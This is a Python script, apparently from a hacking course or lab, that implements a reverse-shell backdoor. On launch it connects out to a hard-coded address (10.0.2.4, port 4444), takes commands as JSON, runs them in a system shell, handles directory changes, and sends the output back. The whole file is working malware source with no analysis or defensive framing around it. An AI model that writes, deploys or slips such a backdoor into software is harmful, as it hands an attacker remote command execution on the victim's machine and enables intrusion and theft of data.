#!/usr/bin/env python
# https://docs.python.org/2/library/socket.html
# https://www.tutorialspoint.com/python/python_networking.htm
import json
import os
import socket
import subprocess

import chardet


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(self.decode(data))
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                byte_data = self.connection.recv(1024)
                json_data = json_data + self.decode(byte_data)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except Exception:
            return "Could not execute command: " + " ".join(command)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            else:
                command_result = self.execute_system_command(command)
            self.reliable_send(command_result)
        connection.close()

    def decode(self, data):
        try:
            encoding = chardet.detect(data)['encoding']
            return data.decode(encoding)
        except (UnicodeDecodeError, AttributeError, TypeError):
            return data


my_backdoor = Backdoor("10.0.2.4", 4444)
my_backdoor.run()
